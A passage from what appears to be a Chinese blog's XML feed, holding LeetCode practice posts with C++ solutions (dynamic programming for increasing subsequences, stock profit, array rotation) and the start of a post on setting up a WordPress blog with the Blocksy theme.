class="hljs-comment">//建立list</span><br>        <span class="hljs-keyword">int</span> first=<span class="hljs-number">0</span>,second=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(first&lt;len1&amp;&amp;second&lt;len2)&#123;<br>              <span class="hljs-keyword">if</span>(nums1[first]==nums2[second])<br>                &#123;<br>                    <span class="hljs-built_in">list</span>.push_back(nums1[first]);<br>                    first++;<br>                    second++;<br>                &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(nums1[first]&gt;nums2[second])&#123;<br>                    second++;<br>            &#125; <span class="hljs-keyword">else</span>&#123;<br>                    first++;<br>                    &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210813022052081.png" alt="效果"></p><h3 id="坑爹的事"><a href="#坑爹的事" class="headerlink" title="坑爹的事"></a>坑爹的事</h3><p>写完了代码，却一直无法AC。返回的list永远是空数组。我很纳闷，排查了一个小时左右。才是发现原来是给first和second的赋值问题。第一次写成<code>int first,second=0;</code>这种形式了。后来改成了<code>int first=0,second=0;</code>就通过了。他妈的！</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 算法 </tag>
            
            <tag> c/c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021暑假leetcode训练（三）</title>
      <link href="/2021/08/12/2021%E6%9A%91%E5%81%87leetcode%E8%AE%AD%E7%BB%83%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2021/08/12/2021%E6%9A%91%E5%81%87leetcode%E8%AE%AD%E7%BB%83%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="回文串与回文子序列问题（动态规划）"><a href="#回文串与回文子序列问题（动态规划）" class="headerlink" title="回文串与回文子序列问题（动态规划）"></a>回文串与回文子序列问题（动态规划）</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>今天瞟了一眼每日一题，发现是中等题目，于是我就打算解一下，结果我连题目都没读懂。</p><p>题目是<a href="https://leetcode-cn.com/problems/longest-palindromic-subsequence/">516.最长回文子序列</a>。</p><p>这道题目用到的解题技巧多数是动态规划。然鹅我并不懂什么是动态规划，好在下学期的《算法设计》里面会讲到。趁着如今还是暑假，我决定先把这块硬骨头啃掉，但是咱并不能一口吃个胖子，所以要循序渐进的一步一步来。</p><h2 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h2><p>给你一个整数数组 <code>nums</code> ，找到其中最长严格递增子序列的长度。</p><p>子序列是由数组派生而来的序列，删除（或不删除）数组中的元素而不改变其余元素的顺序。例如，[3,6,2,7] 是数组 [0,3,1,6,2,2,7] 的子序列。</p><p><strong>示例 1：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">输入：nums = [10,9,2,5,3,7,101,18]<br>输出：4<br>解释：最长递增子序列是 [2,3,7,101]，因此长度为 4 。<br></code></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">输入：nums = [0,1,0,3,2,3]<br>输出：4<br></code></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">输入：nums = [7,7,7,7,7,7,7]<br>输出：1<br></code></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= nums.length &lt;= 2500</code></li><li><code>-104 &lt;= nums[i] &lt;= 104</code></li></ul><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>dp[i]的定义</li></ul><p><strong>dp[i]表示i之前包括i的最长上升子序列</strong>。</p><ul><li>状态转移方程</li></ul><p>位置i的最长升序子序列等于j从0到i-1各个位置的最长升序子序列 + 1 的最大值。</p><p>所以：if (nums[i] &gt; nums[j]) dp[i] = max(dp[i], dp[j] + 1);</p><p><strong>这一步要理解，目的就是为了更新dp[i]，每遍历一次对应位置的dp[i]都要被更新或不更新。dp[j]代表直到j这个位置的数字的最长子序列有多长，因为nums[i]&gt;nums[j]了，所以i这个位置的数字的最长子序列的长度肯定比j这个位置长，那么就dp[j]+1，然后再与目前dp[i]比一下大小，如果大就更新，如果小于或等于就不更新。这样可以确保，一次遍历后，dp[i]的值就是到i这个位置的最长子序列的长度。</strong></p><ul><li>dp[i]的初始化</li></ul><p>每一个i，对应的dp[i]（即最长上升子序列）起始大小至少都是是1.</p><ul><li>确定遍历顺序</li></ul><p>dp[i] 是由0到i-1各个位置的最长升序子序列 推导而来，那么遍历i一定是从前向后遍历。</p><p>j其实就是0到i-1，遍历i的循环里外层，遍历j则在内层，代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; nums.size(); i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++) &#123;<br>        <span class="hljs-keyword">if</span> (nums[i] &gt; nums[j]) dp[i] = max(dp[i], dp[j] + <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (dp[i] &gt; res) res = dp[i]; <span class="hljs-comment">// 取长的子序列</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>C++代码如下：</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">lengthOfLIS</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(nums.size()&lt;<span class="hljs-number">2</span>)<br>            <span class="hljs-keyword">return</span> nums.size();<br>        <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">dp</span><span class="hljs-params">(nums.size(), <span class="hljs-number">1</span>)</span></span>;<br>        <span class="hljs-comment">//创建dp数组，记录每个dp[i]的严格最长升序子序列.创建了容器并初始化了容器。</span><br>        <span class="hljs-keyword">int</span> res = <span class="hljs-number">1</span>;<span class="hljs-comment">//最大子序列现在是1</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i =<span class="hljs-number">1</span>;i&lt;nums.size();i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;j&lt;i;j++)&#123;<br>                <span class="hljs-keyword">if</span>(nums[i]&gt;nums[j])<br>                    dp[i] = max(dp[i],dp[j]+<span class="hljs-number">1</span>);<br>                   <span class="hljs-comment">//判断dp[i]是否应该被更新，每遍历一次之后的dp[i]，就是到i这个位置的最长上升子序列的长度。</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(dp[i]&gt;res)<br>                res = dp[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210812223317353.png" alt="效果"></p><h2 id="最长连续递增序列"><a href="#最长连续递增序列" class="headerlink" title="最长连续递增序列"></a>最长连续递增序列</h2><p>给定一个未经排序的整数数组，找到最长且 连续递增的子序列，并返回该序列的长度。</p><p>连续递增的子序列 可以由两个下标<code>l</code>和<code> r</code>（<code>l &lt; r</code>）确定，如果对于每个 <code>l &lt;= i &lt; r</code>，都有 <code>nums[i] &lt; nums[i + 1]</code> ，那么子序列 <code>[nums[l], nums[l + 1], ..., nums[r - 1], nums[r]]</code> 就是连续递增子序列。</p><p><strong>示例 1：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">输入：nums = [1,3,5,4,7]<br>输出：3<br>解释：最长连续递增序列是 [1,3,5], 长度为3。<br>尽管 [1,3,5,7] 也是升序的子序列, 但它不是连续的，因为 5 和 7 在原数组里被 4 隔开。 <br></code></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">输入：nums = [2,2,2,2,2]<br>输出：1<br>解释：最长连续递增序列是 [2], 长度为1。<br></code></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><p><code>1 &lt;= nums.length &lt;= 104</code></p></li><li><p><code>109 &lt;= nums[i] &lt;= 109</code></p></li></ul><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>上面求最长升序子序列，并未要求连续。所以最长递增子序列，存在离散情况，需要使用j与i依次进行比较。但本题要求<mark class="hl-label orange">连续</mark> ，所以不必使用j，即不必使用双重循环。一次for循环就好。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">findLengthOfLCIS</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (nums.size()==<span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> res = <span class="hljs-number">1</span>;<span class="hljs-comment">//如果数组有元素，则最小连续子序列为1；</span><br>        <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">dp</span><span class="hljs-params">(nums.size() ,<span class="hljs-number">1</span>)</span></span>;<span class="hljs-comment">//创建容器并初始化。</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;nums.size()<span class="hljs-number">-1</span>;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(nums[i+<span class="hljs-number">1</span>]&gt;nums[i])<br>                dp[i+<span class="hljs-number">1</span>] = dp[i]+<span class="hljs-number">1</span>;<span class="hljs-comment">//如果位置在i+1的元素值比i位置的大，那么在对应的dp[i+1]中的长度自然就要比dp[i]大1；</span><br>        <span class="hljs-keyword">if</span>(res&lt;dp[i+<span class="hljs-number">1</span>])<br>                res = dp[i+<span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210813000659509.png" alt="效果"></p><p>上面使用了dp数组，实际上不必另创数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">findLengthOfLCIS</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> sum = <span class="hljs-number">1</span>;<span class="hljs-comment">//记录总长度</span><br>        <span class="hljs-keyword">int</span> count = <span class="hljs-number">1</span>;<span class="hljs-comment">//记录连续数组的长度</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;nums.size()<span class="hljs-number">-1</span>;i++)&#123;<br>            <span class="hljs-keyword">if</span>(nums[i]&lt;nums[i+<span class="hljs-number">1</span>])<br>            &#123;<br>                count++;<br>                sum = max(sum,count);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                count = <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210813001740180.png" alt="更高效的算法"></p><p>在写这道题目的时候，突然啊想起来了训练2的<a href="https://1905060202.github.io/2021/08/10/2021%E6%9A%91%E5%81%87leetcode%E8%AE%AD%E7%BB%83%EF%BC%88%E4%BA%8C%EF%BC%89/">买卖股票的最佳时机 II</a>,于是就想着能不能用动态规划把那道题解一下。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; prices)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> len = prices.size();<br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&gt; dp(len, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>));<br>        dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] -= prices[<span class="hljs-number">0</span>];<br>        dp[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; len; i++) &#123;<br>            dp[i][<span class="hljs-number">0</span>] = max(dp[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>], dp[i - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>] - prices[i]); <br>            dp[i][<span class="hljs-number">1</span>] = max(dp[i - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>], dp[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>] + prices[i]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> dp[len - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 算法 </tag>
            
            <tag> c/c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021暑假leetcode训练（二）</title>
      <link href="/2021/08/10/2021%E6%9A%91%E5%81%87leetcode%E8%AE%AD%E7%BB%83%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2021/08/10/2021%E6%9A%91%E5%81%87leetcode%E8%AE%AD%E7%BB%83%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="初级算法（二）"><a href="#初级算法（二）" class="headerlink" title="初级算法（二）"></a>初级算法（二）</h1><h2 id="买卖股票的最佳时机-II"><a href="#买卖股票的最佳时机-II" class="headerlink" title="买卖股票的最佳时机 II"></a>买卖股票的最佳时机 II</h2><p>给定一个数组 <code>prices</code> ，其中 <code>prices[i]</code> 是一支给定股票第<code>i</code> 天的价格。</p><p>设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。</p><p><strong>注意</strong>：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a><strong>示例 1:</strong></h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">输入: prices = [7,1,5,3,6,4]<br>输出: 7<br>解释: 在第<span class="hljs-number"> 2 </span>天（股票价格 = 1）的时候买入，在第<span class="hljs-number"> 3 </span>天（股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 =<span class="hljs-number"> 4 </span>。<br>     随后，在第<span class="hljs-number"> 4 </span>天（股票价格 = 3）的时候买入，在第<span class="hljs-number"> 5 </span>天（股票价格 = 6）的时候卖出, 这笔交易所能获得利润 = 6-3 =<span class="hljs-number"> 3 </span>。<br></code></pre></td></tr></table></figure><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例 2:"></a>示例 2:</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">输入: prices = [1,2,3,4,5]<br>输出: 4<br>解释: 在第<span class="hljs-number"> 1 </span>天（股票价格 = 1）的时候买入，在第<span class="hljs-number"> 5 </span>天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 =<span class="hljs-number"> 4 </span>。<br>     注意你不能在第<span class="hljs-number"> 1 </span>天和第<span class="hljs-number"> 2 </span>天接连购买股票，之后再将它们卖出。因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。<br></code></pre></td></tr></table></figure><p><strong>示例 3:</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">输入: prices = [7,6,4,3,1]</span><br><span class="hljs-section">输出: 0</span><br><span class="hljs-section">解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。</span><br></code></pre></td></tr></table></figure><h3 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h3><ul><li><code>1 &lt;= prices.length &lt;= 3 * 104</code></li><li><code>0 &lt;= prices[i] &lt;= 104</code></li></ul><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; prices)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(prices.size()&lt;<span class="hljs-number">2</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> max = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> d = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;prices.size();i++)&#123;<br>            d = prices[i]-prices[i<span class="hljs-number">-1</span>];<br>            <span class="hljs-keyword">if</span>(d&gt;<span class="hljs-number">0</span>)<br>            max+=d;<br>        &#125;<br>        <span class="hljs-keyword">return</span> max;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210810230543708.png" alt="结果"></p><h3 id="一些理解"><a href="#一些理解" class="headerlink" title="一些理解"></a>一些理解</h3><p>本题的思路是求解上升区间的高度和。</p><h2 id="旋转数组"><a href="#旋转数组" class="headerlink" title="旋转数组"></a>旋转数组</h2><p>给定一个数组，将数组中的元素向右移动 <code>k</code> 个位置，其中 <code>k</code> 是非负数。</p><h3 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h3><ul><li>尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。</li><li>你可以使用空间复杂度为 O(1) 的 <strong>原地</strong> 算法解决这个问题吗？</li></ul><h3 id="示例-1-1"><a href="#示例-1-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">输入: nums = <span class="hljs-string">[1,2,3,4,5,6,7]</span>, k = <span class="hljs-number">3</span><br>输出: <span class="hljs-string">[5,6,7,1,2,3,4]</span><br>解释:<br>向右旋转 <span class="hljs-number">1</span> 步: <span class="hljs-string">[7,1,2,3,4,5,6]</span><br>向右旋转 <span class="hljs-number">2</span> 步: <span class="hljs-string">[6,7,1,2,3,4,5]</span><br>向右旋转 <span class="hljs-number">3</span> 步: <span class="hljs-string">[5,6,7,1,2,3,4]</span><br></code></pre></td></tr></table></figure><h3 id="示例-2-1"><a href="#示例-2-1" class="headerlink" title="示例 2:"></a>示例 2:</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">输入：nums = [<span class="hljs-string">-1</span>,<span class="hljs-string">-100</span>,3,99], k = 2<br>输出：[3,99,<span class="hljs-string">-1</span>,<span class="hljs-string">-100</span>]<br>解释: <br>向右旋转 1 步: [99,<span class="hljs-string">-1</span>,<span class="hljs-string">-100</span>,3]<br>向右旋转 2 步: [3,99,<span class="hljs-string">-1</span>,<span class="hljs-string">-100</span>]<br></code></pre></td></tr></table></figure><h3 id="提示：-1"><a href="#提示：-1" class="headerlink" title="提示："></a>提示：</h3><ul><li><code>1 &lt;= nums.length &lt;= 2 * 104</code></li><li><code>-231 &lt;= nums[i] &lt;= 231 - 1</code></li><li><code>0 &lt;= k &lt;= 105</code></li></ul><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">rotate</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>        <span class="hljs-comment">//创建临时数组</span><br>         <span class="hljs-keyword">int</span> len = nums.size();<br>        <span class="hljs-keyword">int</span> nums2[len];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; len;i++)<br>        &#123;<br>            <span class="hljs-keyword">int</span> w = (i+k)%(len);<br>            nums2[w]=nums[i];<br>        &#125;<br>         <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; len;i++)<br>        &#123;<br>            nums[i]=nums2[i];<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210811003509645.png" alt="结果"></p><blockquote><p>作者：力扣 (LeetCode)<br>链接：<a href="https://leetcode-cn.com/">https://leetcode-cn.com/</a><br>来源：力扣（LeetCode）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 算法 </tag>
            
            <tag> c/c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress之搭建博客</title>
      <link href="/2021/08/05/wordpress%E4%B9%8B%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/08/05/wordpress%E4%B9%8B%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h1><p>腾讯云检测到我的服务器有漏洞，这如同晴天霹雳，我这两天一直在搭建新的博客，完全没有深入配置服务器，这下可好，又要把搭建博客的工作先放一放了。不过，这两天的搭建工作确实让自己有了收获，这份收获在于如何用wordpress快速搭建起一个看着还过得去的<mark class="hl-label orange">blog</mark> 。</p><h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p>wordpress原生主题看着还过得去，不过我的审美被apple惯坏了，看着它扁平化和卡片化的设计，我也想把自己的博客改造成那般摸样。于是我的第一步工作就是更换一套主题。我选择的是<mark class="hl-label pink">Blocksy</mark> 。它卡片化的设计正合我意。</p><h2 id="新建博客页面"><a href="#新建博客页面" class="headerlink" title="新建博客页面"></a>新建博客页面</h2><p>由于Blocksy面向的是商业，所以blog元素基本上没有。这就需要我手动建立一个blog页面。</p><h3 id="新建页面"><a href="#新建页面" class="headerlink" title="新建页面"></a>新建页面</h3><p><img src="/images/python/%E6%96%B0%E5%BB%BA%E9%A1%B5%E9%9D%A2.png" alt="新建页面"></p><p>按图所示，顺序执行。</p><h3 id="将blog添加到菜单"><a href="#将blog添加到菜单" class="headerlink" title="将blog添加到菜单"></a>将blog添加到菜单</h3><p><img src="/images/python/image-20210805184602048.png" alt="进入自定义"></p><p><img src="/images/python/image-20210805183642782.png" alt="菜单"></p><p><img src="/images/python/image-20210805183751845.png" alt="继续"></p><p>上面的方法不免有些繁琐，那是我第一次尝试所使用的方法。后来找到了更快捷的办法，一步到位 。</p><p><img src="/images/python/image-20210805191912222.png" alt="新方法"></p><p>然后选择添加项目，如果你感觉菜单栏上的顺序不满意，可以选择第二步重新排序。</p><p><img src="/images/python/image-20210805183854577.png" alt="添加项目"></p><h3 id="将blog页面设为文章页"><a href="#将blog页面设为文章页" class="headerlink" title="将blog页面设为文章页"></a>将blog页面设为文章页</h3><p><img src="/images/python/image-20210805184012688.png" alt="第一步"></p><p>选择设置-&gt;阅读</p><p><img src="/images/python/image-20210805184054239.png" alt="第二步"></p><p>将blog设为文章页，大功告成！</p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/images/python/image-20210805184358319.png" alt="优美的页面"></p><h2 id="建立网课资源页面"><a href="#建立网课资源页面" class="headerlink" title="建立网课资源页面"></a>建立网课资源页面</h2><p>这是今年暑假的一个目标，去实现一个网课转播平台。将优质的网课资源集中到<mark class="hl-label blue">数据社区</mark> 来，替同学们省去寻找网课的时间。</p><p>这将会是<mark class="hl-label blue">数据社区</mark> 的第一个功能，想想就令人激动！</p><h3 id="方法1-利用iframe将视频插入"><a href="#方法1-利用iframe将视频插入" class="headerlink" title="方法1-利用iframe将视频插入"></a>方法1-利用iframe将视频插入</h3><p>许多大型网站的内容都有“嵌入”选项，以iFrame代码提供其网站内容。</p><p>举了例子，如果你需要分享B站的视频，你只需要在具体的视频页面，点击视频播放器下方的分享按钮，即可看到嵌入代码，如下图所示：</p><p><img src="/images/python/image-20210805213251421.png" 